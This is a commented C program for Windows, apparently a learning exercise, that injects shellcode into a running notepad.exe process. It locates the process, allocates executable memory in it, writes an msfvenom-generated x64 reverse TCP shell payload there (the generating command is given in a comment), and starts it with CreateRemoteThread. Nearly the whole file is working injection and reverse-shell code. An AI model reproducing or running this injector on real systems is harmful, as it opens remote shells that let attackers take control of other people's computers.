#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>

/*
	stdio.h
	- printf

	windows.h
	- HANDLE => Is used as a reference.
	- CloseHandle => Closes an open object handle.
	- wcscmp => Compares 2 utf-16 strings.
	- wchar_t => Is used for wide characters. (utf-16)
	- VirtualAllocEx => Allocates a virtual memory space in a remote process.
	- LPVOID => Is a pointer to a void object.
	- PAGE_EXECUTE_READWRITE
	- MEM_COMMIT
	- WriteProcessMemory
	- LPCVOID => Is a 32-bit pointer to a constant of any type.
	- CreateRemoteThread
	- LPSECURITY_ATTRIBUTES
	- LPDWORD => Is a pointer to a DWORD.

	TlHelp32.h
	- CreateToohelp32Snapshot
	- TH32CS_SNAPALL => Include all running processes.
	- Process32First
	- Process32Next
	- OpenProcess
	- PROCESS_ALL_ACCESS => Request all the access of a process.
*/

/*
	We can return one of these:
	- -1 => Process could not be found.
	- -2 => There is an issue with snapshot (empty list etc.)
*/
int getProcessId(HANDLE snapshot, wchar_t* processName) {
	/*
		Let's create an empty process entry.
		we'll assign this while we iterate the process list.
	*/
	PROCESSENTRY32 processEntry;
	/*
		The size of the structure, in bytes.Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
		If you do not initialize dwSize, Process32First fails.
	*/
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	/*
		Let's try to get the first process.
		Process32First takes the snapshot and assigns the first process to processEntry.
	*/
	BOOL success = Process32First(snapshot, &processEntry);

	// Check if have any problem with the process list.
	if (!success)
		return -2;

	// Iterate while we still have a process to check.
	while (success) {
		/*
			Let's check if we find a process with the name we supplied via processName parameter.
			Remember, we need to compare utf-16 strings.

			0 => Equal.
		*/
		if (wcscmp(processEntry.szExeFile, processName) == 0) {
			// When we found the process, we need to return process id of the process.
			return processEntry.th32ProcessID;
		}

		// We need to get the next process until either there is no left process or we find what we want.
		success = Process32Next(snapshot, &processEntry);
	}
}

HANDLE takeSnapshot() {
	// Let's take a snapshot of all running processes.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

	return snapshot;
}


int main(int argc, char** argv) {
	HANDLE snapshot = takeSnapshot();

	// We use TEXT function to specify utf-16 strings.
	int processId = getProcessId(snapshot, TEXT("notepad.exe"));
	printf("Process Id: %d\n", processId);

	CloseHandle(snapshot);

	// We'll open the process of notepad.
	HANDLE notepad = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	/*
		msfvenom --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.x.y LPORT=4444 EXITFUNC=thread -f c
		EXITFUNC=thread => Avoids to close the main process. (notepad.exe)
	*/
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
		"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
		"\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\xbc\x8e\x41\x54"
		"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
		"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
		"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
		"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
		"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
		"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
		"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
		"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
		"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
		"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
		"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
		"\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
		"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
		"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
		"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

	// Let's allocate the virtual memory space.
	LPVOID allocatedBuffer = VirtualAllocEx(notepad, NULL, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	if (allocatedBuffer) {
		// We'll write the reverse shell into the virtual memory space.
		WriteProcessMemory(notepad, allocatedBuffer, shellcode, sizeof shellcode, NULL);

		// Execute shellcode by creating a remote thread.
		CreateRemoteThread(notepad, NULL, 0, (LPTHREAD_START_ROUTINE)allocatedBuffer, NULL, 0, NULL);
	}

	CloseHandle(notepad);
	return 0;
}
